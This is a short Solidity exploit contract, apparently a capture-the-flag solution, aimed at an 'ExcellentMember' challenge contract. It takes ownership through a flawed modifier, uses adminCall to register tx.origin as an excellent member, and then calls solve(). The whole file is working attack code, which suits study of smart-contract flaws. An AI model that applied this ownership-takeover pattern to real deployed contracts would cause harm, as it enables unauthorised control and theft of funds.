// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IExcellentMember {
    function transferOwnership(address newOwner) external;
    function adminCall(address target, bytes memory data) external payable returns (bytes memory);
    function setJoin(bool opinion) external;
    function registryExcellentMember(address member) external;
    function solve() external;
    function excellentMember(address member) external view returns (bool);
}

contract Exploit {
    IExcellentMember target;
    address public owner;
    
    constructor(address _target) {
        target = IExcellentMember(_target);
        owner = msg.sender;
    }
    
    function exploit() external {
        // First, user must call setJoin(true) directly before calling this function
        
        // Step 1: Take ownership using the flawed modifier
        target.transferOwnership(address(this));
        
        // Step 2: Now as the owner, we can use adminCall to make the contract itself 
        // (which is already an excellent member) call registryExcellentMember for tx.origin
        bytes memory data = abi.encodeWithSignature("registryExcellentMember(address)", tx.origin);
        target.adminCall(address(target), data);
        
        // Step 3: Call solve to set solved to true
        target.solve();
    }
}
